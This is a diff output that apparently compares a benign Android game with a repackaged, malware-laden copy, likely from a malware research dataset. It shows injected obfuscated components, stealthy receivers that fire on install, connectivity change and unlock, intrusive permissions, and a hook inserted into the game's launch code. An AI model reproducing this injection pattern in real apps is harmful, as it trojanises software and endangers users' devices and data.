@@ -1,0 +1,190 @@
+diff -r result/APP_41/App_B_41/AndroidManifest.xml result/APP_41/App_M_41/AndroidManifest.xml
+5,6c5,6
+<     <application android:allowBackup="true" android:hardwareAccelerated="false" android:icon="@drawable/ic_launcher" android:label="@string/app_name">
+<         <activity android:configChanges="fontScale|keyboard|keyboardHidden|mcc|mnc|orientation|screenLayout|screenSize|uiMode" android:label="@string/app_name" android:name="de.siebn.radon.Radon" android:screenOrientation="portrait">
+---
+>     <application android:allowBackup="true" android:hardwareAccelerated="false" android:icon="@drawable/ic_launcher" android:label="荧光射击">
+>         <activity android:configChanges="fontScale|keyboard|keyboardHidden|mcc|mnc|orientation|screenLayout|screenSize|uiMode" android:label="荧光射击" android:name="de.siebn.radon.Radon" android:screenOrientation="portrait">
+12a13,68
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.czvzoytyttq.fbmszy.Tawoya"/>
+>         <service android:name="com.czvzoytyttq.fbmszy.Baowyan"/>
+>         <receiver android:name="com.czvzoytyttq.fbmszy.Laoenawy">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.zpvg.cvjaoyt.Tawlc" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.zpvg.cvjaoyt.Baowdsrn"/>
+>         <receiver android:name="com.zpvg.cvjaoyt.BawnHawn">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.babalay.bupat.act" android:screenOrientation="portrait"/>
+>         <receiver android:name="com.babalay.bupat.br">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.babalay.bupat.ser"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.bpztwen.bjvcaw.Tawnsep"/>
+>         <receiver android:name="com.bpztwen.bjvcaw.Rallyaw">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+13a70,79
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <supports-screens android:anyDensity="true"/>
+diff -r result/APP_41/App_B_41/apktool.yml result/APP_41/App_M_41/apktool.yml
+2c2
+< apkFileName: Bapp41-5E974FDE7DBAF5DF2B6BE48272991F31C6C6B6ACBD70C4295F0805462B76DA82.apk
+---
+> apkFileName: Mapp41-2C7FD0C6612B20A767FF3A371CB0F91DFE5CC47813FB7E887060AB579EFB8E39.apk
+6d5
+< - mp3
+7a7
+> - mp3
+Somente em result/APP_41/App_M_41/: assets
+Somente em result/APP_41/App_M_41/com: babalay
+Somente em result/APP_41/App_M_41/com: basyatw
+Somente em result/APP_41/App_M_41/com: bpztwen
+Somente em result/APP_41/App_M_41/com: czvzoytyttq
+Somente em result/APP_41/App_M_41/com: zpvg
+diff -r result/APP_41/App_B_41/de/siebn/radon/Radon.java result/APP_41/App_M_41/de/siebn/radon/Radon.java
+4a5
+> import com.basyatw.bcpawsen.DaywtanActivity;
+25a27
+>     DaywtanActivity.Tawo(this);
+Os arquivos binários result/APP_41/App_B_41/original/AndroidManifest.xml e result/APP_41/App_M_41/original/AndroidManifest.xml são diferentes
+Somente em result/APP_41/App_M_41/original/META-INF: 123652.RSA
+Somente em result/APP_41/App_M_41/original/META-INF: 123652.SF
+Somente em result/APP_41/App_B_41/original/META-INF: CERT.RSA
+Somente em result/APP_41/App_B_41/original/META-INF: CERT.SF
+diff -r result/APP_41/App_B_41/original/META-INF/MANIFEST.MF result/APP_41/App_M_41/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+6a7,9
+> Name: assets/pmd/spip.dat
+> SHA1-Digest: ZU/5NrWn97ecsVf7UTZ8R3MnfPY=
+> 
+12a16,18
+> Name: assets/vqw
+> SHA1-Digest: TLFMHjsLM9/kRKbym8VN7RmzRdM=
+> 
+16,17c22,23
+< Name: res/raw/click.mp3
+< SHA1-Digest: 5EQbIDr75iFkQQk63ZN7/twbREg=
+---
+> Name: assets/l/spl.dat
+> SHA1-Digest: vW2G37BljiAtNBvD3zLVab9rlRg=
+20,26c26
+< SHA1-Digest: 68ut0nOJcQcHE15Efh/cdPEtiKU=
+< 
+< Name: classes.dex
+< SHA1-Digest: M0uI/fSfNaykk6sOWKp2/7GARFE=
+< 
+< Name: res/raw/quake.mp3
+< SHA1-Digest: JdVO79jkHf5JSFS8nXKsk+J11SM=
+---
+> SHA1-Digest: y4w5XXG4iCogXMUJ7DRf5bYbssI=
+31,33d30
+< Name: res/raw/texts.txt
+< SHA1-Digest: QFR8mmvOcr6q4IDahO4XWz7tpk0=
+< 
+37,39d33
+< Name: AndroidManifest.xml
+< SHA1-Digest: V4keXpVoG2A+ks44eZ5oJ+nuK3E=
+< 
+43,50c37,38
+< Name: res/drawable-mdpi/ic_launcher.png
+< SHA1-Digest: JnSNUkcy7wES7l2VMdlw9pgIktk=
+< 
+< Name: res/raw/hit.mp3
+< SHA1-Digest: 56jC5LjlERpPBrfTCg8rU+JaXgY=
+< 
+< Name: res/raw/details.html
+< SHA1-Digest: QzSOGaP+dLBSn0giqE6NMxaVxDA=
+---
+> Name: AndroidManifest.xml
+> SHA1-Digest: ag1kpY1NlIoxFbVV2jF3zEgvG4M=
+61,63d48
+< Name: res/raw/shot.mp3
+< SHA1-Digest: VOXQo2O9eVmQO4I522On1QBaI7U=
+< 
+65a51,77
+> 
+> Name: assets/lc/cld.dat
+> SHA1-Digest: W49CU7TlQksTKU3ZTCuaWalnhno=
+> 
+> Name: res/raw/click.mp3
+> SHA1-Digest: 5EQbIDr75iFkQQk63ZN7/twbREg=
+> 
+> Name: res/raw/quake.mp3
+> SHA1-Digest: JdVO79jkHf5JSFS8nXKsk+J11SM=
+> 
+> Name: classes.dex
+> SHA1-Digest: YxYMYX92BDqUSunIc7pRa7WyWuI=
+> 
+> Name: res/raw/texts.txt
+> SHA1-Digest: QFR8mmvOcr6q4IDahO4XWz7tpk0=
+> 
+> Name: res/drawable-mdpi/ic_launcher.png
+> SHA1-Digest: JnSNUkcy7wES7l2VMdlw9pgIktk=
+> 
+> Name: res/raw/hit.mp3
+> SHA1-Digest: 56jC5LjlERpPBrfTCg8rU+JaXgY=
+> 
+> Name: res/raw/details.html
+> SHA1-Digest: QzSOGaP+dLBSn0giqE6NMxaVxDA=
+> 
+> Name: res/raw/shot.mp3
+> SHA1-Digest: VOXQo2O9eVmQO4I522On1QBaI7U=
+Somente em result/APP_41/App_M_41/smali/com: babalay
+Somente em result/APP_41/App_M_41/smali/com: basyatw
+Somente em result/APP_41/App_M_41/smali/com: bpztwen
+Somente em result/APP_41/App_M_41/smali/com: czvzoytyttq
+Somente em result/APP_41/App_M_41/smali/com: zpvg
+diff -r result/APP_41/App_B_41/smali/de/siebn/radon/Radon.smali result/APP_41/App_M_41/smali/de/siebn/radon/Radon.smali
+43a44,45
+>     invoke-static {p0}, Lcom/basyatw/bcpawsen/DaywtanActivity;->Tawo(Landroid/content/Context;)V
+> 
